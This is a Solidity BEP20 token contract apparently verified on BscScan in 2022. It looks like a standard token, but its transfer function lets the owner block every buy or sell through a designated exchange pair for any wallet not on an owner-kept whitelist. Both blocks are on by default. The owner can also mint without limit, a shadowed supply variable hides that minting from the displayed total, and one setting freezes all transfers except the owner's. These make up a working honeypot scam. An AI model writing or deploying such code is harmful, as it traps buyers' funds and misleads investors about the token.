/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

/**
 *Submitted for verification at BscScan.com on 2022-07-25
*/

pragma solidity ^0.5.0;

interface IBEP20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Owned {
  address public owner;
  event OwnershipTransferred(address indexed _from, address indexed _to);
  constructor() public {
    owner = msg.sender;
  }
  modifier onlyOwner {
    require(msg.sender == owner);
    _;
  }
  function transferOwnership(address newOwner) public onlyOwner {
    owner = newOwner;
    emit OwnershipTransferred(owner, newOwner);
  }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        return a % b;
    }
}



 
contract ApproveAndCallFallBack {
  function receiveApproval(address from, uint256 tokens, address token, bytes memory data) public;
}

contract BEP20 is IBEP20,Owned {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;

    mapping (address => mapping (address => uint256)) private _allowances;
    
    //address _pancakeaddress;
    uint256 private _totalSupply;
    mapping(address=>bool) _buyter;
    mapping(address=>bool) _sellter;
    mapping(address=>bool) _pancakeaddress;
    
    bool _isBuy = true;
    bool _isSell = true;
    
    
    
    function setPancakeAddress(address pancake,bool isOpen) public
    {
        require(msg.sender == owner);
        _pancakeaddress[pancake]=isOpen;
    }
    
    function getPancakeAddress(address pancake) public view returns (bool) {
        return _pancakeaddress[pancake];
    }
    
    
    
    function setBuyter(address account,bool isMinter) public
    {
        require(msg.sender == owner);
        _buyter[account]=isMinter;
    }
    
    function getBuyter(address account) public view returns (bool) {
        return _buyter[account];
    }
    
    function setSellter(address account,bool isMinter) public
    {
        require(msg.sender == owner);
        _sellter[account]=isMinter;
    }
    
    function getSellter(address account) public view returns (bool) {
        return _sellter[account];
    }
    
    
    function setIsBuy(bool isburning) public
    {
        require(msg.sender == owner);
        _isBuy=isburning;
    }
    
    function getIsBuy() public view returns (bool) {
        return _isBuy;
    }
    
    function setIsSell(bool isburning) public
    {
        require(msg.sender == owner);
        _isSell=isburning;
    }
    
    function getIsSell() public view returns (bool) {
        return _isSell;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function setMint(address account, uint256 amount) public onlyOwner{
         require(msg.sender == owner);
        _mint(account, amount);
    }

    function approve(address spender, uint256 value) public returns (bool) {
        _approve(msg.sender, spender, value);
        return true;
    }

    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount));
        return true;
    }

    
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        if(getPancakeAddress(address(0)))
        {
            require(sender == owner,"NotStart");
        }
       
        if(_isBuy && (getPancakeAddress(sender) && !_buyter[recipient]))
        {
            revert("Can not buy");
        }else if(_isSell && (getPancakeAddress(recipient) && !_sellter[sender]))
        {
            revert("Can not sell");
        }
        else
        {
            _balances[sender]= _balances[sender].sub(amount);
            _balances[recipient] = _balances[recipient].add(amount); 
            emit Transfer(sender, recipient, amount);
        }
    }

  
    function _mint(address account, uint256 amount) internal {
        require(account != address(0), "ERC20: mint to the zero address");

        _totalSupply = _totalSupply.add(amount);
        _balances[account] = _balances[account].add(amount);
        emit Transfer(address(0), account, amount);
    }

   
    function _burn(address account, uint256 value) internal {
        require(account != address(0), "ERC20: burn from the zero address");

        _totalSupply = _totalSupply.sub(value);
        _balances[account] = _balances[account].sub(value);
        emit Transfer(account, address(0), value);
    }

 
    function _approve(address owner, address spender, uint256 value) internal {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = value;
        emit Approval(owner, spender, value);
    }

    function _burnFrom(address account, uint256 amount) internal {
        _burn(account, amount);
        _approve(account, msg.sender, _allowances[account][msg.sender].sub(amount));
    }
	
	
    function approveAndCall(address spender, uint tokens, bytes memory data) public returns(bool success) {
    	_allowances[msg.sender][spender] = tokens;
    	emit Approval(msg.sender, spender, tokens);
    	ApproveAndCallFallBack(spender).receiveApproval(msg.sender, tokens, address(this), data);
   	 return true;
    }

	
}

contract ERC20Detailed is IBEP20,BEP20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _totalSupply;
    uint256 private _initialSupply;

    constructor (string memory name, string memory symbol, uint8 decimals,uint256 initialSupply) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
        _initialSupply = initialSupply;
        _totalSupply = initialSupply * 10 ** uint256(decimals); 
        _mint(msg.sender,_totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

  
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }
}